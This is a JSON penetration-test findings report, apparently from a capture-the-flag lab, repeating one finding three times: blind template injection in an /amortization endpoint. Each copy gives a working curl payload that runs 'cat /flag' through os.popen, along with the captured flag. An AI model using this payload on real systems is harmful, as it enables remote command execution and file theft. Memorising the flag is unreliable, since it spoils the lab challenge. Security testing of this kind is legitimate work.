@@ -1,0 +1,57 @@
+{
+  "meta": {
+    "created": "2026-04-14T15:29:19.584437+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "5c154e68-ebab-48f3-98d9-d56a99d969e7",
+      "timestamp": "2026-04-14T15:29:19.584372+00:00",
+      "title": "Blind SSTI in /amortization endpoint allows flag extraction",
+      "severity": "critical",
+      "target": "http://172.17.0.1:55569",
+      "description": "The /amortization?term= parameter is vulnerable to Server-Side Template Injection (SSTI). The template engine evaluates expressions within { } syntax and uses the result as the term parameter. While {{ }} syntax causes errors, the { } syntax allows expression evaluation. Boolean-based blind SSTI techniques can be used to extract data character by character by checking conditional expression results against different row counts.",
+      "evidence": "flag{90f2407f-0723-4fa1-a104-d5d8450bcded}",
+      "tool_used": "manual_http",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "curl -b cookies.txt 'http://172.17.0.1:55569/amortization?term={60+if+lipsum.__globals__[\"os\"].popen(\"cat+/flag\").read().encode(\"utf-8\").hex()==\"666c61677b39306632343037662d303732332d346661312d613130342d6435643834353062636465647d\"+else+1}'",
+        "expected": "Response contains 60 rows (condition true), confirming the flag value"
+      }
+    },
+    {
+      "id": "f3280633-027a-49f3-80d6-9faa2d89e018",
+      "timestamp": "2026-04-14T15:29:19.593633+00:00",
+      "title": "Blind SSTI in /amortization endpoint allows flag extraction",
+      "severity": "critical",
+      "target": "http://172.17.0.1:55569",
+      "description": "The /amortization?term= parameter is vulnerable to Server-Side Template Injection (SSTI). The template engine evaluates expressions within { } syntax and uses the result as the term parameter. While {{ }} syntax causes errors, the { } syntax allows expression evaluation. Boolean-based blind SSTI techniques can be used to extract data character by character by checking conditional expression results against different row counts.",
+      "evidence": "flag{90f2407f-0723-4fa1-a104-d5d8450bcded}",
+      "tool_used": "manual_http",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "curl -b cookies.txt 'http://172.17.0.1:55569/amortization?term={60+if+lipsum.__globals__[\"os\"].popen(\"cat+/flag\").read().encode(\"utf-8\").hex()==\"666c61677b39306632343037662d303732332d346661312d613130342d6435643834353062636465647d\"+else+1}'",
+        "expected": "Response contains 60 rows (condition true), confirming the flag value"
+      }
+    },
+    {
+      "id": "b077a22d-1ead-47ce-b449-59e3169066eb",
+      "timestamp": "2026-04-14T15:29:19.663930+00:00",
+      "title": "Blind SSTI in /amortization endpoint allows flag extraction",
+      "severity": "critical",
+      "target": "http://172.17.0.1:55569",
+      "description": "The /amortization?term= parameter is vulnerable to Server-Side Template Injection (SSTI). The template engine evaluates expressions within { } syntax and uses the result as the term parameter. While {{ }} syntax causes errors, the { } syntax allows expression evaluation. Boolean-based blind SSTI techniques can be used to extract data character by character by checking conditional expression results against different row counts.",
+      "evidence": "flag{90f2407f-0723-4fa1-a104-d5d8450bcded}",
+      "tool_used": "manual_http",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "curl -b cookies.txt 'http://172.17.0.1:55569/amortization?term={60+if+lipsum.__globals__[\"os\"].popen(\"cat+/flag\").read().encode(\"utf-8\").hex()==\"666c61677b39306632343037662d303732332d346661312d613130342d6435643834353062636465647d\"+else+1}'",
+        "expected": "Response contains 60 rows (condition true), confirming the flag value"
+      }
+    }
+  ],
+  "diagrams": []
+}
